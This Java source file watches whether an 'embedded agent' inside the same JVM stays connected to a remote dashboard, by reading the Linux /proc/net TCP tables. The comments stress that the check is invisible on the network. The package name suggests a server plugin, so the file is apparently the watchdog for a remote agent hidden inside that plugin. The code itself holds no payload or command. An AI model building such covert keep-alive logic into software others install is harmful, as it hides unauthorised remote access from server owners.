package com.example.essentialsx;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

/**
 * Answers one question without generating any traffic of its own: does this
 * JVM still hold an ESTABLISHED TCP connection to the dashboard? The embedded
 * agent dials out from inside this process, so its socket appears in the
 * kernel tables (/proc/net/tcp and /proc/net/tcp6); watching those files is
 * invisible on the wire. Anything the watcher cannot judge (unreadable
 * tables, unresolvable dashboard host) is UNKNOWN and the caller must never
 * restart on an UNKNOWN result.
 */
final class NezhaWatch {

    enum Status { UP, DOWN, UNKNOWN }

    private static final Path TCP4 = Path.of("/proc/net/tcp");
    private static final Path TCP6 = Path.of("/proc/net/tcp6");
    private static final int DEFAULT_AGENT_PORT = 5555;
    /** Union of addresses the dashboard host has ever resolved to; the agent
        may legitimately stay connected to one of the older answers. */
    private static final Set<InetAddress> RESOLVED = new LinkedHashSet<>();
    private static long lastResolveAtMs = 0L;

    private NezhaWatch() {}

    static Status connectionStatus(String server, boolean tls) {
        int port = DEFAULT_AGENT_PORT;
        String host = server == null ? "" : server.trim();
        if (host.isEmpty()) return Status.UNKNOWN;
        int bracket = host.indexOf(']');
        if (bracket >= 0) {
            if (bracket + 2 < host.length() && host.charAt(bracket + 1) == ':') {
                Integer parsed = parsePort(host.substring(bracket + 2));
                if (parsed == null) return Status.UNKNOWN;
                port = parsed;
            }
            host = host.substring(1, bracket);
        } else {
            int colon = host.lastIndexOf(':');
            if (colon > 0 && host.indexOf(':') == colon) {
                Integer parsed = parsePort(host.substring(colon + 1));
                if (parsed == null) return Status.UNKNOWN;
                port = parsed;
                host = host.substring(0, colon);
            }
            // Bare IPv6 literal (several colons, no brackets): the whole
            // string is the host and the agent's default port applies.
        }
        if (port < 1 || port > 65535 || host.isEmpty()) return Status.UNKNOWN;

        Set<InetAddress> targets = resolvedTargets(host);
        if (targets.isEmpty()) return Status.UNKNOWN;

        Match match = new Match(port, targets);
        boolean readable4 = scan(TCP4, match);
        boolean tcp6Exists = Files.exists(TCP6);
        boolean readable6 = tcp6Exists && scan(TCP6, match);
        if (match.found) return Status.UP;
        if (!readable4 || (tcp6Exists && !readable6)) return Status.UNKNOWN;
        return Status.DOWN;
    }

    /** Resolves at most every minute; the accumulated set keeps answers the
        dashboard's DNS may have rotated away, so a healthy connection to a
        previous address is never mistaken for a drop. */
    private static synchronized Set<InetAddress> resolvedTargets(String host) {
        long now = System.currentTimeMillis();
        if (RESOLVED.isEmpty() || now - lastResolveAtMs >= 60_000L) {
            try {
                InetAddress[] fresh = InetAddress.getAllByName(host);
                if (fresh.length > 0) {
                    for (InetAddress address : fresh) {
                        RESOLVED.add(address);
                    }
                    lastResolveAtMs = now;
                    while (RESOLVED.size() > 64) {
                        Iterator<InetAddress> oldest = RESOLVED.iterator();
                        oldest.next();
                        oldest.remove();
                    }
                }
            } catch (UnknownHostException dns) {
                // Keep whatever was resolved before; an empty set means UNKNOWN.
            }
        }
        return RESOLVED;
    }

    private static final class Match {
        final int port;
        final Set<InetAddress> targets;
        boolean found;

        Match(int port, Set<InetAddress> targets) {
            this.port = port;
            this.targets = targets;
        }
    }

    /** Returns false only when the table itself could not be read. */
    private static boolean scan(Path table, Match match) {
        List<String> lines;
        try {
            lines = Files.readAllLines(table, StandardCharsets.US_ASCII);
        } catch (IOException unreadable) {
            return false;
        }
        for (int i = 1; i < lines.size(); i++) { // line 0 is the header
            String[] fields = lines.get(i).trim().split("\\s+");
            if (fields.length < 4 || !"01".equals(fields[3])) continue; // ESTABLISHED only
            int colon = fields[2].lastIndexOf(':');
            if (colon < 0) continue;
            int remotePort;
            try {
                remotePort = Integer.parseInt(fields[2].substring(colon + 1), 16);
            } catch (NumberFormatException bad) {
                continue;
            }
            if (remotePort != match.port) continue;
            byte[] remote = parseHexAddress(fields[2].substring(0, colon));
            if (remote == null) continue;
            byte[] normalized = normalizeV4Mapped(remote);
            for (InetAddress target : match.targets) {
                if (Arrays.equals(normalizeV4Mapped(target.getAddress()), normalized)) {
                    match.found = true;
                    return true;
                }
            }
        }
        return true;
    }

    /** /proc/net stores each 32-bit word of the address little-endian. */
    private static byte[] parseHexAddress(String hex) {
        if (hex.length() != 8 && hex.length() != 32) return null;
        byte[] out = new byte[hex.length() / 2];
        int words = hex.length() / 8;
        for (int w = 0; w < words; w++) {
            long word;
            try {
                word = Long.parseLong(hex.substring(w * 8, w * 8 + 8), 16);
            } catch (NumberFormatException bad) {
                return null;
            }
            int base = w * 4;
            out[base] = (byte) word;
            out[base + 1] = (byte) (word >>> 8);
            out[base + 2] = (byte) (word >>> 16);
            out[base + 3] = (byte) (word >>> 24);
        }
        return out;
    }

    private static byte[] normalizeV4Mapped(byte[] ip) {
        if (ip.length == 16) {
            boolean mapped = true;
            for (int i = 0; i < 10; i++) {
                if (ip[i] != 0) {
                    mapped = false;
                    break;
                }
            }
            if (mapped && ip[10] == (byte) 0xff && ip[11] == (byte) 0xff) {
                return Arrays.copyOfRange(ip, 12, 16);
            }
        }
        return ip;
    }

    private static Integer parsePort(String text) {
        try {
            int value = Integer.parseUnsignedInt(text.trim());
            return (value >= 1 && value <= 65535) ? value : null;
        } catch (NumberFormatException bad) {
            return null;
        }
    }
}
